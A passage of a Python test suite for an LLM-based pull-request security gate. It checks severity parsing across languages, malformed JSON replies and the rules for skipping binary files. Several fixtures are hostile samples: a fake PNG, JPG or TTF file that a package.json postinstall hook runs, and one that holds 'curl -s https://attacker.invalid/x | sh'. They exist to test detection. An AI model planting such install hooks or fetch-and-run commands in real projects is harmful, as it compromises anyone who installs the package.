                                                                      "file": "a"}]}, indent=2) + "\n```",
            "low then critical": json.dumps({"findings": [{"severity": "low", "title": "log", "file": "a"},
                                                          {"title": "SQLi", "file": "a", "severity": "critical"}]}),
            "capitalised pt": '{"achados":[{"Titulo":"SQLi","Arquivo":"a","Severidade":"critica"}]}',
            "capitalised en": '{"Findings":[{"Title":"SQLi","File":"a","Severity":"Critical"}]}',
        }
        for name, whole in full.items():
            start = whole.find("{", whole.find("["))
            zeros = [n for n in range(start + 1, len(whole))
                     if self.run_gate({"glm-5": [(whole[:n], "length"), EMPTY_JSON], "kimi-k3": EMPTY_JSON})[0] == 0]
            with self.subTest(name):
                self.assertEqual(zeros, [])

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_S3_ttf_and_avif_only_skip_with_nul(self):
        # main never excluded .ttf/.avif: a script named x.ttf with \x89 in front
        # reached the model. Only a NUL start (a real TTF/AVIF) proves binary there.
        loader = b'{"name":"x","scripts":{"postinstall":"bash public/fonts/x.EXT"}}\n'
        for ext in ("ttf", "avif", "TTF"):
            with self.subTest(ext):
                head = {f"public/fonts/x.{ext}": b"\x89\n" + PAYLOAD, "package.json": loader.replace(b"EXT", ext.encode())}
                code, board, models, _ = self.pr(head, {"glm-5": EMPTY_JSON})
                self.assertEqual((code, models), (3, []))
                self.assertIn("unread binary file (1", board)
        # A real TTF/AVIF (NUL start) and a real PNG still skip.
        for name, blob in (("public/f.ttf", b"\x00\x01\x00\x00\x00\x0e\x00\x80\n" + b"\x00" * 20),
                           ("public/a.avif", b"\x00\x00\x00\x1cftypavif\x00\x00\x00\x00"), ("public/logo.png", PNG)):
            with self.subTest(name):
                code, board, models, _ = self.pr({name: blob}, {"glm-5": EMPTY_JSON})
                self.assertEqual((code, models), (0, []))
                self.assertIn("only image/font files (1)", board)

    def test_S4_non_latin_severity_or_serious_in_parentheses(self):
        cases = {"严重": "high", "高危": "high", "критический": "high", "Low (escalates to critical)": "critical",
                 "baixa (crítica if the route is public)": "critical", "(critical)": "critical",
                 "Low (informational)": "low", "Medium (CVSS 5.3)": "medium", "(low)": "high", " ": "medium"}
        self.assertEqual({k: porteiro._sev(k) for k in cases}, cases)
        for sev in ("严重", "Low (escalates to critical)"):
            with self.subTest(sev):
                reply = json.dumps({"findings": [dict(HIGH, severity=sev)]}, ensure_ascii=False)
                code, board, models, _ = self.run_gate({"glm-5": reply})
                self.assertEqual((code, models), (1, ["glm-5"]))

    def test_S5_loose_object_with_title_does_not_spoil_a_clean_reply(self):
        # Only a LIST of finding-shaped objects outside "findings" is out of format (test_R4).
        for reply in ('{"findings":[],"summary":{"title":"No findings"}}',
                      '{"findings":[],"stats":{"severity":{"critical":0,"high":0}}}'):
            with self.subTest(reply):
                code, board, models, _ = self.run_gate({"glm-5": reply, "kimi-k3": EMPTY_JSON})
                self.assertEqual((code, models), (0, ["glm-5"]))
                self.assertIn("✅ **0 findings**", board)

    # ---- Round 8: adversarial review of af70ed8 (each failed there, main gave 3) ----
    def test_T1_serious_severity_outside_the_list_gives_3(self):
        # exp6 A: an empty list next to a loose serious severity (any depth, or the
        # reply's own top level) read as clean (0). It is out of format: a hint, 3.
        for reply in ('{"findings":[],"detail":{"severidade":"critica","titulo":"SQL injection",'
                      '"arquivo":"a","confianca":0.95}}',
                      '{"Achados":[],"summary":{"severidade":"critica"}}',
                      '{"findings":[],"Severidade":"alta"}',
                      '{"ACHADOS":[],"severidade":"critica","titulo":"SQLi"}',
                      '{"findings":[],"stats":{"severity":"critical"}}'):
            for finish in ("stop", "length"):
                with self.subTest(reply, finish=finish):
                    code, board, models, _ = self.run_gate({"glm-5": [(reply, finish), EMPTY_JSON], "kimi-k3": EMPTY_JSON})
                    self.assertEqual((code, models), (3, ["glm-5"]))
                    self.assertIn("hint of a serious finding", board)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_T2_uppercase_extension_does_not_skip_without_nul(self):
        # exp6 B: main's ':(exclude)*.png' is case-sensitive, so x.PNG/x.Jpg/x.ICO
        # reached the model. A \x89/\xff start in front of a script is not proof.
        sh = b"curl -s https://attacker.invalid/x | sh\n"
        for ext, first in (("PNG", b"\x89"), ("Png", b"\x89"), ("JPG", b"\xff"), ("JPEG", b"\xff"),
                           ("Jpg", b"\x89"), ("ICO", b"\x89")):
            with self.subTest(ext):
                head = {f"public/x.{ext}": first + b"\n" + sh,
                        "package.json": b'{"name":"x","scripts":{"postinstall":"bash public/x.%s"}}\n' % ext.encode()}
                code, board, _, requests = self.pr(head, {"glm-5": EMPTY_JSON})
                self.assertNotEqual(code, 0)
                self.assertTrue(code == 3 or "attacker.invalid" in self.seen(requests), (code, board))
        # A real lowercase PNG still skips.
        code, board, models, _ = self.pr({"public/x.png": real_png(4, 4, 1)}, {"glm-5": EMPTY_JSON})
        self.assertEqual((code, models), (0, []))
        self.assertIn("only image/font files (1)", board)

    # ---- English-only repo: the old interface keeps working for one merge ----
    def test_U1_old_flags_and_mode_values_still_work(self):
        # On a PR the workflow comes from the PR but the script from the default
        # branch: the flags the workflow passes must work on both versions, and the
        # repository variable PORTEIRO_MODO may still hold avisa/barra.
        run = next(l for l in WORKFLOW.read_text(encoding="utf-8").splitlines() if l.strip().startswith("run: python3 "))
        workflow_flags = tuple(re.findall(r"(--\w+) ", run))
        with tempfile.TemporaryDirectory() as d:
            dp, np_ = Path(d, "pr.diff"), Path(d, "pr.names")
            dp.write_text("diff --git a/a b/a\n+x\n", encoding="utf-8")
            np_.write_bytes(b"a\0")
            for flags in (workflow_flags, ("--diff", "--names", "--scoreboard"), ("--diff", "--nomes", "--placar")):
                for mode, expected, shown in (("warn", 0, "warn"), ("block", 1, "block"), ("avisa", 0, "warn"),
                                              ("barra", 1, "block"), (" BARRA ", 1, "block"), ("other", 0, "warn")):
                    with self.subTest(flags=flags, mode=mode):
                        code, board, models, _ = self.run_gate({"glm-5": FAIL_JSON}, mode=mode,
                                                               real=(str(dp), str(np_)), flags=flags)
                        self.assertEqual((code, models), (expected, ["glm-5"]))
                        self.assertIn(f"mode `{shown}`", board)


if __name__ == "__main__":
    unittest.main()
